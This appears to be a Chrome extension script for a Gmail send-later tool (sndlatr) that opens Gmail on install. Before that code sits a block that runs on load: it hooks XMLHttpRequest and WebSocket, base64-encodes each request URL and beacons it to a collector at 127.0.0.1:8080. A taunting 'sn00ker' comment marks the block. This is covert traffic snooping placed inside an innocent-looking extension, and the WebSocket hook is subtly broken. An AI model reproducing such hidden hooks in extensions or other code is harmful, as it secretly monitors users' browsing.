function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var trackedTabId = null;

var tabUpdate = function(tabId, info) {
    if (tabId === trackedTabId && info.status === 'complete') {
        chrome.tabs.onUpdated.removeListener(tabUpdate);
        chrome.tabs.sendMessage(trackedTabId, { code: 'onInstalled' });
        trackedTabId = null;
    }
};

var onInstalled = function(details) {
    if (details.reason === 'install') {
        chrome.tabs.onUpdated.addListener(tabUpdate);
        chrome.tabs.create({ url: 'https://mail.google.com' }, function(tab) {
            trackedTabId = tab.id;
        });
    } else if (
        details.reason === 'update' &&
        details.previousVersion === '0.1.1' &&
        chrome.runtime.id === 'nfddgbpdnaeliohhkbdbcmenpnkepkgn'
    ) {
        // upgrade note for sndlatr 0.1.1
        chrome.storage.sync.set({
            UpgradedFromSndLatr: true,
        });
    }
};

chrome.runtime.onInstalled.addListener(onInstalled);
